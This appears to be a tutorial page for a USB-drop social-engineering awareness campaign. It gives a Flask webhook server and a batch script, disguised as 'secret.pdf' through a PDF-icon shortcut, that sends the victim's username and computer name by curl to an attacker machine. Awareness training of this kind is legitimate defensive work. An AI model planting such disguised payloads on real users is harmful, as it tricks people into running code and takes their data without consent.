---
icon: usb
---

# USB stick awareness

If you watch Mr. Robot, you must remember a scene where Darlene drops several USB sticks around a prison in order to Elliot get an reverse shell access. All that is needed is someone to pick it up and plug into a computer. Pretty cool, right?

<figure><img src="../.gitbook/assets/usbstick.gif" alt=""><figcaption><p>Mr. Robot Season 1, Episode 6.</p></figcaption></figure>

So, I'm not actually going to show how to create a Rubber Ducky for malicious purposes, instead, let's create a social engineering campaign with regular USB sticks. The purpose is to drop the USB sticks and create awareness to every user.

We need an attacker machine, ideally Kali running a Flask server, and as many USB sticks as you want.

So, let's dive into it!

**Prerequisites**

* **Python**: Make sure you have Python installed on your machine. You can download it from python.org.
*   **Flask**: You can install Flask using pip. Open your terminal or command prompt and run:

    ```bash
    pip install Flask
    ```

**Step-by-Step Guide to Create a Webhook**

1.  **Create a New Directory**: Create a new directory for your webhook project and navigate into it.

    ```bash
    mkdir my_webhook
    cd my_webhook
    ```
2. **Create a Python File**: Create a new Python file, e.g., `webhook.py`, and open it in your text editor.
3.  **Write the Webhook Code**: Add the following code to `webhook.py`:

    ```python
    from flask import Flask, request, jsonify
    import logging

    app = Flask(__name__)

    # Set up logging
    logging.basicConfig(level=logging.INFO)

    @app.route('/webhook', methods=['POST'])
    def webhook():
        # Get the JSON data from the request
        data = request.json
        
        # Log the received data
        logging.info(f"Received data: {data}")

        # Respond with a success message
        return jsonify({"status": "success", "message": "Data received"}), 200

    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=5000)
    ```
4.  **Run the Webhook Server**: In your terminal, run the following command to start the Flask server:

    ```bash
    python webhook.py
    ```

    The server will start and listen for incoming requests on `http://localhost:5000/webhook`.
5.  **Testing the Webhook**: You can test the webhook using a tool like curl or Postman. Here’s how to test it using curl: Open a new terminal window and run:

    {% code overflow="wrap" %}
    ```bash
    curl -X POST http://localhost:5000/webhook -H "Content-Type: application/json" -d "{\"username\":\"test_user\", \"message\":\"USB accessed\"}"
    ```
    {% endcode %}

    You should see a response indicating that the data was received, and the server logs should show the received data.

**Now for the USB stick**

1.  **Create a batch file**: Create a new batch file, **script.bat** in the root of the USB stick:

    {% code overflow="wrap" %}
    ```batch
    @echo off
    setlocal

    REM Open Social Engineering Awareness document
    start "" "awareness.pdf"

    REM Retrieve user information
    set USERNAME=%USERNAME%
    set COMPUTERNAME=%COMPUTERNAME%

    REM Set USERINFO with escaped quotes
    set USERINFO={\"id\":\"0\",\"username\":\"%USERNAME%\", \"computername\":\"%COMPUTERNAME%\"}

    echo Sending the following JSON: %USERINFO%

    REM Send the information to the Flask server
    curl -X POST http://server_ip:5000/webhook -H "Content-Type: application/json" -d "%USERINFO%"

    Endlocal
    ```
    {% endcode %}

    Make sure you change the **server\_ip** for the actual attacker machine IP.
2. **Download an .ico file**: We can use a .ico file repository like [https://www.shareicon.net/](https://www.shareicon.net/t) and download any pdf .ico you like. Place it at the root of the USB stick.
3. **Move the awareness.pdf** file also into the root of the USB stick.
4. **Create a shortcut of the script.bat file**: Right click the shortcut, go to properties and click on **Change icon** and choose the .ico file you just downloaded it. Then rename the file to something mysterious like **secret.pdf**
5. **Put all the files Hidden except for the shortcut, secret.pdf**: Then we untick the **Hidden items** option

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>All visible files</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>What the user will see, hopefully</p></figcaption></figure>

Sure, we can see it is a shortcut, and we must rely on the fact that the victim has the 'Hidden items' option unticked. However, the purpose is for the user to notice the small details and create awareness within the organization.

{% hint style="info" %}
If noticed in the script.bat had the following line:

{% code overflow="wrap" %}
```batch
set USERINFO={\"id\":\"0\",\"username\":\"%USERNAME%\", \"computername\":\"%COMPUTERNAME%\"}
```
{% endcode %}

The 'id' parameter is useful when multiple USB sticks are used. For example, you can number the USB sticks and adjust the script accordingly. If someone plugs in USB stick 1 on the first floor (build A, room X, etc.), you will receive the information on the Flask server.
{% endhint %}



